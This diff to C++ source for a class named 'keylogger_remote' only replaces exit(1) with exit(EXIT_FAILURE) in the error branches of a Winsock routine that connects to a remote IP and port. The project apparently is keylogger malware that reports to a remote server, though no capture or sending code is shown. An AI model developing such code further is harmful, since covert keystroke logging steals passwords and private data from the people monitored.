@@ -23,7 +23,7 @@ void keylogger_remote::initialize(string p_ip_address, int p_port)
 	if(t_result != NO_ERROR)
 	{
 		cerr << "connect : " << t_result << " : " <<  WSAGetLastError() << endl;
-		exit(1);
+		exit(EXIT_FAILURE);
 	}
 
 	SOCKADDR_IN t_sockaddr_in;
@@ -37,7 +37,7 @@ void keylogger_remote::initialize(string p_ip_address, int p_port)
 	{
 		cerr << "connect : " << t_result << " : " <<  WSAGetLastError() << endl;
 		WSACleanup();
-		exit(1);
+		exit(EXIT_FAILURE);
 	}
 
 	t_result = connect(a_socket, (SOCKADDR *)&t_sockaddr_in, sizeof(t_sockaddr_in));
@@ -46,7 +46,7 @@ void keylogger_remote::initialize(string p_ip_address, int p_port)
 	{
 		cerr << "connect : " << t_result << " : " <<  WSAGetLastError() << endl;
 		WSACleanup();
-		exit(1);
+		exit(EXIT_FAILURE);
 	}
 }
 
